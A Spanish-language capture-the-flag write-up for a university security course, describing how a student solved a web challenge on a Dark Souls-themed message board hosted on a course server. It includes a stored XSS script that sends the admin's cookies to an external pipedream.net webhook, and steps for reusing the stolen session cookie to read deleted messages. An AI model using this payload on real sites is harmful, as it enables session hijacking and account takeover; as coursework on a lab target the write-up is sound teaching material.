# Writeup P3 Tarea 2

**Nombre**: Valentina Rojas Osorio

**Equipo**: Hack Pals

# Desarrollo 

 _Para la solución de este problema, se está obviando la **instalación** de herramientas vistas durante el curso, sin embargo, se especifica detalladamente cómo utilizarlas en cada paso. También se especifican usos e instalación de herramientas externas (no vistas)._
 
 _Además, se debe estar conectado a la VPN del CEC, para tener acceso al servidor 172.17.69.241_

---
 Comenzamos con un foro con temática de Dark Souls que nos permite dejar mensajes que se crean mediante templates, es decir, no podemos dejar un mensaje libremente.

1. Procedemos a inspeccionar la página, vemos que en el header están linkeados 2 archivos _.js_, uno corresponde a css que es archivo de estilos por lo que no nos interesa. 

1. En el inspector, nos dirigimos a la pestaña Debugger, luego a Sources, y en la carpeta assets, encontramos el archivo js que no es de estilos.


1. Nos vamos a la ubicación del archivo _js_ para ver mejor su contenido. http://172.17.69.241:54321/assets/index.f6853aaf.js

## Api Root Django

Nos dirigirnos a http://172.17.69.241:54321/assets/index.f6853aaf.js para ver mejor el contenido del script.

1. El archivo contiene principalmente las palabras del template para generar mensajes. Si seguimos bajando, encontramos la siguiente línea
    ```js
    methods:{sendMessage(){fetch("http://172.17.69.241:5432/messages/",{method:"POST"
    ```
    Esto significa que los mensajes se reciben de otro puerto, en especifico del puerto 5432.

1. Al dirigirnos a http://172.17.69.241:5432/messages/ nos encontramos con la Api Root de Django y al final de la página aparece un "form" que nos permite dejar mensajes.

1. Escribimos cualquier mensaje y lo enviamos, al revisar el puerto 54321, podemos corroborar que nuestro mensaje aparece ahí.

1. Al revisar todas las opciones/herramientas que tiene la página, seleccionamos el apartado "filters", nos aparecerá el filtro `Is deleted:` en estado "Unknown", luego lo cambiamos a "Yes" y damos click a Submit. 

1. La página nos redirige a http://172.17.69.241:5432/messages/?is_deleted=true y  encontramos un mensaje eliminado que dice:
    ```
    "content": you don't have the right, O you don't have the right so to speak<br>try cookie"
    ```
    Esto significa que necesitamos una cookie de administrador para poder ver este contenido.

1. Como anteriormente encontramos el "panel" donde podemos postear mensajes, atacamos con una inyección, enviando como mensaje un script que nos permita robar la cookie del admin aprovechando que se mete constantemente al servidor.


1. Siguiendo el hint del equipo docente, se debe modificar el script con el que hemos trabajado anteriormente para que se ejecute de inmediato, de esta forma el script que enviaremos es
    ```js
    <script>
        let cookies = document.cookie;
        let connip = 'link';
        fetch(${connip}?cookies=${cookies}).then(response => console.log(response));
    </script>
    ```
    * _En link, debemos poner el url del server que creamos para recibir las peticiones GET con el servicio web [pipedream](https://pipedream.com/)_


## Pipedream

Para poder hostear un server, hay que crearse una cuenta en pipedream.com

1. Una vez creada la cuenta, creamos un Workflow, seleccionamos New HTTP/Webhook Request y corroboramos que se reciban request con response code 200, apretamos Save and continue y nos entregará el link de nuestro server, la URL se verá más o menos así
     ```
     https://eovg4q6yd8q47c3.m.pipedream.net
     ```
    Esta es la URL que debemos poner en el 'link' de nuestro script.

1. Luego hacemos `deploy`, y esperamos que nos aparezcan las request en los eventos del servidor, debemos fijarnos en las de tipo GET y al ver los detalles nos saldrá información de la Cookie de quien hace las request.

## Cookie del admin

Hay una cookie que se logra capturar más de una vez y tiene nombre "diferente"
```
Name = SESSION_ID
Value = 5c6ffbdd40d9556b73a21e63c3e0e904
```

Abrimos el inspector en http://172.17.69.241:5432/messages/?is_deleted=true nos vamos a la pestaña Storage y seteamos la cookie con los parámetros anteriores. 

Recargamos la página y podremos visualizar 2 páginas de mensajes eliminados, si nos vamos a la página 2, encontramos el siguiente mensaje

```
"id": 165,
"created_at": "2022-05-18T19:16:09.796221Z",
"content": "something incredibe ahead in short<br>try CC5325{th0u_4rt_0f_p4551NG_sk1ll}",
"is_deleted": true
```

## Resultados

Finalmente, la flag de este problema es
```
CC5325{th0u_4rt_0f_p4551NG_sk1ll}
```


     

    